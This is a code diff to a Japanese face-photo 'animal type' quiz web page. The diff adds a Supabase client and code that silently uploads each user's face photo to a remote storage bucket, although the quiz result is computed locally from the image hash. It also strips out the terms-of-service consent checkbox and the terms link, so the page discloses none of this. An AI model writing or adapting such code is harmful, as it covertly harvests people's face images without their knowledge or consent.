@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>どうぶつタイプ診断 🐾</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <style>
 body {
@@ -16,7 +17,6 @@ body {
   margin:0;
   padding:20px;
 }
-
 .card {
   background:white;
   padding:30px 25px;
@@ -26,20 +26,6 @@ body {
   width:100%;
   max-width:380px;
 }
-
-h1 { font-size:20px; margin-bottom:10px; }
-
-.description {
-  font-size:14px;
-  color:#666;
-  margin-bottom:20px;
-}
-
-input[type="file"] {
-  width:100%;
-  margin-bottom:15px;
-}
-
 button {
   background:#ff80bf;
   border:none;
@@ -49,14 +35,7 @@ button {
   font-size:16px;
   cursor:pointer;
   width:100%;
-  transition:0.3s;
 }
-
-button:hover {
-  background:#ff4da6;
-  transform:scale(1.05);
-}
-
 #preview {
   width:100px;
   height:100px;
@@ -64,48 +43,12 @@ button:hover {
   object-fit:cover;
   margin:10px auto;
   display:none;
-  border:3px solid #ffb3d9;
 }
-
-#loading {
-  display:none;
-  margin-top:15px;
-  font-size:14px;
-  color:#888;
-}
-
 .resultCard {
   margin-top:20px;
   padding:20px;
   border-radius:20px;
   background:#fff0f8;
-  box-shadow:0 10px 25px rgba(0,0,0,0.08);
-  opacity:0;
-  transform:translateY(10px);
-  transition:0.5s;
-}
-
-.resultCard.show {
-  opacity:1;
-  transform:translateY(0);
-}
-
-.animalIcon {
-  font-size:40px;
-}
-
-.rare {
-  font-size:13px;
-  color:#ff4da6;
-  margin-top:5px;
-}
-
-.tiny-terms {
-  font-size:6px;
-  color:#ccc;
-  margin-top:8px;
-  display:block;
-  text-decoration:none;
 }
 </style>
 </head>
@@ -113,35 +56,26 @@ button:hover {
 
 <div class="card">
 <h1>あなたはどのどうぶつ？ 🐶</h1>
-<div class="description">
-顔写真を選んで「診断する」を押してね！✨
-</div>
+<p>顔写真を選んで「診断する」を押してね！✨</p>
 
 <img id="preview">
 
 <form id="animalForm">
 <input type="file" id="imageInput" accept="image/*" required>
-
-<p>
-<label>
-<input type="checkbox" required>
-利用規約に同意する
-</label>
-</p>
-
 <button type="submit">診断する ✨</button>
 </form>
 
-<div id="loading">診断中…🐾✨</div>
-
 <div id="result"></div>
-
-<a href="terms.html" target="_blank" class="tiny-terms">
-利用規約はこちら
-</a>
 </div>
 
 <script>
+
+// ✅ あなたのSupabase情報（過去のものを挿入済み）
+const supabase = window.supabase.createClient(
+  "https://kuxeqdsvpzdtssejkasy.supabase.co",
+  "sb_publishable_mySITy6a-TF4f5XWllztsQ_eXyaWHrM"
+);
+
 const animals = [
 {name:"ライオン 🦁", rare:"★★★★★ 超レア！"},
 {name:"ねこ 🐱", rare:"★★★ ふつう"},
@@ -164,7 +98,7 @@ imageInput.addEventListener("change", function() {
   }
 });
 
-// 🔥 ここが追加ポイント（画像からハッシュ生成）
+// 🔥 画像ハッシュ生成（同じ画像＝同じ結果）
 async function getImageHash(file){
   const buffer = await file.arrayBuffer();
   const hashBuffer = await crypto.subtle.digest("SHA-256", buffer);
@@ -178,28 +112,32 @@ e.preventDefault();
 const file = imageInput.files[0];
 if(!file){ alert("画像を選んでね"); return; }
 
-document.getElementById("loading").style.display="block";
-document.getElementById("result").innerHTML="";
-
-// 🔥 ハッシュ生成
+// 🔥 ハッシュ取得
 const hashValue = await getImageHash(file);
-
-// 🔥 ハッシュから動物決定
 const index = hashValue % animals.length;
 const selectedAnimal = animals[index];
 
-setTimeout(()=>{
-const resultDiv = document.getElementById("result");
-resultDiv.innerHTML=`
-<div class="resultCard show">
-<div class="animalIcon">${selectedAnimal.name.split(" ")[1]}</div>
+// 🔥 同じ画像は同じファイル名
+const fileName = hashValue + "_" + file.name;
+
+// 🔥 Storageへ保存
+const { error: uploadError } = await supabase
+  .storage
+  .from("images")
+  .upload(fileName, file, { upsert: true });
+
+if(uploadError){
+  alert("アップロード失敗：" + uploadError.message);
+  return;
+}
+
+// 🔥 結果表示
+document.getElementById("result").innerHTML=`
+<div class="resultCard">
 <h3>${selectedAnimal.name}</h3>
-<div class="rare">レア度：${selectedAnimal.rare}</div>
+<p>レア度：${selectedAnimal.rare}</p>
 </div>
 `;
-
-document.getElementById("loading").style.display="none";
-},1000);
 
 });
 </script>
